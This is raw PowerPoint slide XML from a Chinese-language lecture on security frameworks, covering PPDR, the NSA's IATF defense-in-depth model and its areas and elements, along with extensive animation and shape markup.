                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="13" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="8294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82947">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82947">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82947">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="18" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="82947">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82947">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82947">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82947">
                                            <p:txEl>
                                              <p:pRg st="2" end="2"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="23" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="82947">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82947">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82947">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82947">
                                            <p:txEl>
                                              <p:pRg st="3" end="3"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="28" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="82947">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82947">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829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p:bldP spid="8294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1043608" y="755649"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>再看</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PPDR</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="84995" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="539552" y="1556792"/>
            <a:ext cx="8191500" cy="1584176"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>安全管理的持续性、安全策略的动态性：</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>以实时监视网络活动、发现威胁和弱点来调整和填补网络漏洞。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="矩形 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="755576" y="3140968"/>
            <a:ext cx="7975476" cy="1403461"/>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可测即可控</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="742950" lvl="1" indent="-285750" eaLnBrk="0" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="FF9900"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2600" dirty="0">
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>通过经常对网络系统的评估把握系统风险点，及时弱化甚至堵塞系统的安全漏洞。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="28461501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fade">
                                      <p:cBhvr>
                                        <p:cTn id="7" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="8499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4995">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="10" dur="500"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="8499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539552" y="738613"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>IATF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>深度防御保障模型</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="87043" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="323528" y="1484784"/>
            <a:ext cx="8458844" cy="394650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dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>信息保障技术框架（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Information Assurance Technical Framework</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IATF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"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a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>NSA</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>制定的，为保护美国政府和工业界的信息与信息技术设施提供技术指南。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>IATF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>的代表理论为“深度防御（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Defense-in-Depth</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>）”。</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>在关于实现信息保障目标的过程和方法上，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>IATF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>论述了</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>系统工程、系统采购、风险管理、鉴别和鉴定以及生命周期支持</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>等过程，指出了一条较为清晰的建设信息保障体系的路子。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3430841474"/>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827584" y="692696"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>何谓“深度防御”？</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="88067" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="539552" y="2342421"/>
            <a:ext cx="8395084" cy="19506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sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>IATF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>关注四个信息安全保障领域（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>三保护一支撑</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>）</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>本地计算环境</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>区域边界</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>网络和基础设施</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>支撑性基础设施 </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="矩形 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="539552" y="1396887"/>
            <a:ext cx="7848872" cy="830997"/>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en-US" altLang="zh-CN" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>IATF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>强调人、技术、操作这三个核心要素，从多种不同的角度对信息系统进行防护。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="矩形 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="683568" y="4365104"/>
            <a:ext cx="7992888" cy="1200329"/>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dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>在此基础上，对信息信息系统就可以做到多层防护，实现组织的任务</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>业务运作。这样的防护被称为 “深度防护战略（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Defense-in-Depth Strategy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>）”。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="11564273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8067">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="14" dur="1000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="88067">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="15" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="8806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806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8067">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="19" dur="1000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="88067">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="20" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="8806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8806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8067">
                                            <p:txEl>
                                              <p:pRg st="2" end="2"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="24" dur="1000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="88067">
                                            <p:txEl>
                                              <p:pRg st="2" end="2"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="25" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="8806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8806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8067">
                                            <p:txEl>
                                              <p:pRg st="3" end="3"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="29" dur="1000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="88067">
                                            <p:txEl>
                                              <p:pRg st="3" end="3"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="30" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="8806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8806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8067">
                                            <p:txEl>
                                              <p:pRg st="4" end="4"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:animEffect transition="in" filter="fade">
                                      <p:cBhvr>
                                        <p:cTn id="34" dur="1000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="88067">
                                            <p:txEl>
                                              <p:pRg st="4" end="4"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="35" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="8806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8806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1000"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="3"/>
                                        </p:tgtEl>
                                      </p:cBhvr>
                                    </p:animEffect>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="42" dur="1000" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="3"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr>
                                        <p:cTn id="4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P spid="2" grpId="0"/>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090" name="Group 4"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="1475656" y="1242938"/>
            <a:ext cx="6461394" cy="4714618"/>
            <a:chOff x="1338" y="-25"/>
            <a:chExt cx="4262" cy="3818"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="89093" name="Rectangle 5"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1474" y="2432"/>
              <a:ext cx="3765" cy="1270"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:gradFill rotWithShape="1">
              <a:gsLst>
                <a:gs pos="0">
                  <a:srgbClr val="C3C087"/>
                </a:gs>
                <a:gs pos="100000">
                  <a:schemeClr val="bg1"/>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C3C087"/>
              </a:extrusionClr>
            </a:sp3d>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" anchor="ctr">
              <a:flatTx/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:endParaRPr lang="zh-CN" altLang="zh-CN"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="89094" name="AutoShape 6"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2245" y="2024"/>
              <a:ext cx="1633" cy="544"/>
            </a:xfrm>
            <a:prstGeom prst="roundRect">
              <a:avLst>
                <a:gd name="adj" fmla="val 16667"/>
              </a:avLst>
            </a:prstGeom>
            <a:gradFill rotWithShape="1">
              <a:gsLst>
                <a:gs pos="0">
                  <a:schemeClr val="accent1"/>
                </a:gs>
                <a:gs pos="100000">
                  <a:schemeClr val="folHlink"/>
                </a:gs>
              </a:gsLst>
              <a:lin ang="5400000" scaled="1"/>
            </a:gradFill>
            <a:ln w="9525">
              <a:round/>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r"/>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="2400">
                  <a:solidFill>
                    <a:srgbClr val="CC0000"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>技术</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="89095" name="AutoShape 7"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1882" y="1933"/>
              <a:ext cx="1134" cy="363"/>
            </a:xfrm>
            <a:prstGeom prst="roundRect">
              <a:avLst>
                <a:gd name="adj" fmla="val 16667"/>
              </a:avLst>
            </a:prstGeom>
            <a:gradFill rotWithShape="1">
              <a:gsLst>
                <a:gs pos="0">
                  <a:srgbClr val="FFCC99"/>
                </a:gs>
                <a:gs pos="100000">
                  <a:schemeClr val="accent1"/>
                </a:gs>
              </a:gsLst>
              <a:lin ang="5400000" scaled="1"/>
            </a:gradFill>
            <a:ln w="9525">
              <a:round/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
            <a:scene3d>
              <a:camera prst="legacyObliqueTopRight"/>
              <a:lightRig rig="legacyFlat3" dir="b"/>
            </a:scene3d>
            <a:sp3d extrusionH="430200" prstMaterial="legacyMatte">
              <a:bevelT w="13500" h="13500" prst="angle"/>
              <a:bevelB w="13500" h="13500" prst="angle"/>
              <a:extrusionClr>
                <a:srgbClr val="FFCC99"/>
              </a:extrusionClr>
            </a:sp3d>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="none" anchor="ctr">
              <a:flatTx/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="CC0000"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>操作</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="89096" name="AutoShape 8"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1338" y="1253"/>
              <a:ext cx="4037" cy="2540"/>
            </a:xfrm>
